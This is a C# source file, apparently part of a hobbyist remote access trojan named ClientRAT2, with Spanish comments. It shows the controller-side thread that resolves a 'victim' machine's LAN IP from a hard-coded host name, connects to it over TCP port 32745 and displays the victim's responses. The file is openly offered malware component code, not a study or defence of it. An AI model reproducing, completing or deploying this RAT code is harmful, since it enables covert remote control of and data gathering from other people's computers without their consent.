using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientRAT2
{
    //Make a window with the responses of the victim
    //Get and set MainMachineName
    //This class will recive messages from the server. Uses different port of communication
    //Example: Servers says: My Ip is: xxxxx
    //This class says: I will show your ip to the user
    public class ResponseThread
    {
        #region Atributos
        public static TcpClient client;
        public static int port = 32745;//puerto de comunicacion entre las maquinas (por defecto 32745)
        public static string connectTo = "192.168.0.102";//ip de la victima
        public static IPAddress ipaddress = null;
        public static Thread getMessages = new Thread(readMessage);
        public static NetworkStream dataStream;
        public static char[] separator = "/".ToCharArray();//":" separa el comando
        public static string MainMachineName = "DESKTOP-5EI3CAG";
        public static bool networkAvailabilty = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable(); //Disponibilidad de red
        #endregion

        //No me acuerdo para que era esto jaja
        static int getIndex(byte[] buffer)
        {
            int i = 0;
            for (; i < buffer.Length; i++)
            {
                if (buffer[i] == 0x00) { break; }
            }
            return i;
        }
        //Analiza y ejecuta un comando segun el mensaje recibido
        static void analyzeMessage(string msg)
        {
            //Imprimo lo recibido de la victima
            MessageBox.Show(">>Victim response: '" + msg + "' from Port " + port + " at " + DateTime.Now.ToString());              
        }
        //Lee los mensajes recibidos y los manda a analizar
        static void readMessage()
        {
            string temp = "";
            while (true)
            {
                if (dataStream.DataAvailable == true)
                {
                    byte[] buffer = new byte[1048];
                    dataStream.Read(buffer, 0, buffer.Length);
                    int cutAt = getIndex(buffer);
                    for (int i = 0; i < cutAt; i++)
                    {
                        temp += (char)buffer[i];
                    }
                    analyzeMessage(temp);
                    temp = string.Empty;
                }
            }
        }
        //Main
        static void Main(string[] args)
        {
            setConnectTo(MainMachineName);//Seteo que se conecte a mi PC
            bool isValidIp = IPAddress.TryParse(connectTo, out ipaddress);
            if (isValidIp == false)
            {
                Console.WriteLine("Main(): Invalid Ip. Trying second method...");
                ipaddress = Dns.GetHostAddresses(connectTo)[0];
                Console.WriteLine(Dns.GetHostAddresses(connectTo)[0]);
            }

            client = new TcpClient();
            Console.WriteLine("Main(): Trying to connect...");
            do
            {
                try
                {
                    client.Connect(ipaddress, port);
                    dataStream = client.GetStream();
                    getMessages.Start();
                }
                catch (Exception ex) { }
            } while (client.Connected != true);

            Console.WriteLine("--Connection Successful To Victim: " + connectTo + " at port " + port + "--");
        }     
        //Cambia la IP de la victima segun el nombre de su maquina         
        public static void setConnectTo(String name)
        {
            Console.WriteLine("------\nSearching Ipv4 of: " + name + "...");
            // Then using host name, get the IP address list..
            IPHostEntry ipEntry = Dns.GetHostEntry(name);
            IPAddress[] addr = ipEntry.AddressList;
            foreach (IPAddress ip in addr)
            {
                try
                {
                    if (ip.ToString().Contains("192.168"))
                    {
                        Console.WriteLine("Valid Ipv4 found = " + ip.ToString());
                        connectTo = ip.ToString();
                    }
                }
                catch (Exception ex) { Console.WriteLine(">No valid Ipv4 found for " + name); }

            }
        }
        //Cambia la ip de connectTo segun una ip
        public static void setConnectToIP(string ip)
        {
            Console.WriteLine("Changing Ip: " + connectTo + " to " + ip);
            connectTo = ip;
            Console.WriteLine("Successful change");
        }
        //Cambio el puerto de comuniacion
        public static void setport(int _port)
        {
            Console.WriteLine("Changing port: " + port + " to " + _port);
            port = _port;
            Console.WriteLine("Successful change");
        }
    }
}
